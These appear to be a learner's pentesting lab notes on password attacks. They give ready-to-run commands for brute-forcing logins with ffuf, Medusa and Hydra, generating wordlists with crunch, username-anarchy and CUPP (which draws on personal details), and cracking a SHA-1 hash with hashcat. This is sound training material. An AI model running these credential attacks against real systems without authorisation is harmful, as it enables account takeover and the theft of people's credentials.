````shell
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
````

#ffuf 

Word list: [[Automated Discovery]]
#hydra


#### Default passwords:

- [https://cirt.net/passwords](https://cirt.net/passwords)
- https://default-password.info/
- https://datarecovery.com/rd/default-passwords/

https://wiki.skullsecurity.org/index.php?title=Passwords

#### Generate passwords:

`crunch 8 8 0123456789abcdefABCDEF -o crunch.txt` the file generated is 459 GB and contains 54875873536 words.

crunch also lets us specify a character set using the -t option to combine words of our choice. Here are some of the other options that could be used to help create different combinations of your choice:  

@ - lower case alpha characters

, - upper case alpha characters

% - numeric characters

^ - special characters including space

`user@thm$  crunch 6 6 -t pass%%`
           
Crunch will now generate the following amount of data: 700 bytes 0 MB 0 GB 0 TB 0 PB Crunch will now generate the following number of lines: 100 pass00 pass01 pass02 pass03`


### Username anarchy
```shell
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy

./username-anarchy Jane Smith > jane_smith_usernames.txt
```

### CUPP - Common User Passwords Profiler
Generates passwords based on personal info (name, nickname, birthday, etc.)
```shell
sudo apt install cupp -y

cupp -i
```



detect hash type
`λ kali ~ → hashid 8d6e34f987851aa599257d3831a1af040886842f`


dict based attack on sha-1
`λ kali ~ → hashcat -m 100 -a 0 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt`

#### Medusa

```shell
 medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh 
```

```shell-session
la1n23@htb[/htb]$ medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET 
```

 Perform additional checks for empty passwords (`-e n`) and passwords matching the username (`-e s`).
```shell
medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```
